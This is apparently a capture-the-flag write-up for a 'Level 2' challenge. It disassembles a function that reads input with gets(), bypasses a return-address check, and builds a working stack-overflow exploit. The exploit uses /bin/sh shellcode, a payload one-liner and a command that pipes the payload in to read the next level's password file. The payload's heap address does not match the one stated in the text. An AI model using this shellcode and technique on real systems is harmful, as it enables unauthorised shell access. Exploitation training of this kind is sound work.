# Level 2

## Step 1 : Analyse p() function

There is nothing interesting in `main()` so lets go straight to `p()`.

```
   0x080484d4 <+0>:	push   ebp
   0x080484d5 <+1>:	mov    ebp,esp
   0x080484d7 <+3>:	sub    esp,0x68
   0x080484da <+6>:	mov    eax,ds:0x8049860
   0x080484df <+11>:	mov    DWORD PTR [esp],eax
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    eax,[ebp-0x4c]
   0x080484ea <+22>:	mov    DWORD PTR [esp],eax
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
   0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080484fb <+39>:	and    eax,0xb0000000
   0x08048500 <+44>:	cmp    eax,0xb0000000
   0x08048505 <+49>:	jne    0x8048527 <p+83>
```

First we can see that the function `gets()` is use, and we know that we can use it to create a buffer overflow exploit.

The thing is that in this case, there is no call to `system()` or `execv()` in the program.
So we are going to need to use that buffer to write what we call "shellcode".

Also, there is a check (line 39->44) to prevent overwriting the return address to an address within the stack range (0xbf000000 - 0xbfffffff).

## Step 2 : Exploiting the heap

```
   0x08048527 <+83>:	lea    eax,[ebp-0x4c]
   0x0804852a <+86>:	mov    DWORD PTR [esp],eax
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    eax,[ebp-0x4c]
   0x08048535 <+97>:	mov    DWORD PTR [esp],eax
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave
   0x0804853e <+106>:	ret
```

Since overwriting the return address on the stack is not possible, the exploit can be directed towards the heap.
We notice that the buffer is later copied inside a `strdup` function. `eax` is set to the string's address after `strdup` return.
This address is `0x804a008`.

## Step 3 : Crafting the Payload

To exploit the buffer overflow, we need to craft a payload that will:

1. Execute a shellcode on the heap.
2. Overwrite the return address with the address of the allocated heap space.

The shellcode found [here](http://shell-storm.org/shellcode/files/shellcode-575.php) is used for the exploit:

```
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

To determine the offset to overwrite the `eip` (return address) on the stack, we can use a pattern generator like [this](https://wiremask.eu/tools/buffer-overflow-pattern-generator/).

The idea is to generate a string to input in the program. In gdb, when the program segfault, the last eip address is displayed. We need to submit this address in the website to know the offset of `eip`: the offset if `0x50` (80).

## Step 4 : Exploiting the Vulnerability

The shellcode is 21 bytes long, to reach the return address location we are gonna add 59 bytes to our string and then the address of the the allocated string on the heap.

```
python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xb0\x04\x08"' > /tmp/payload
```

Let's pipe this into the program

```
(cat /tmp/payload; echo "cat /home/user/level3/.pass") | ~/level2
```
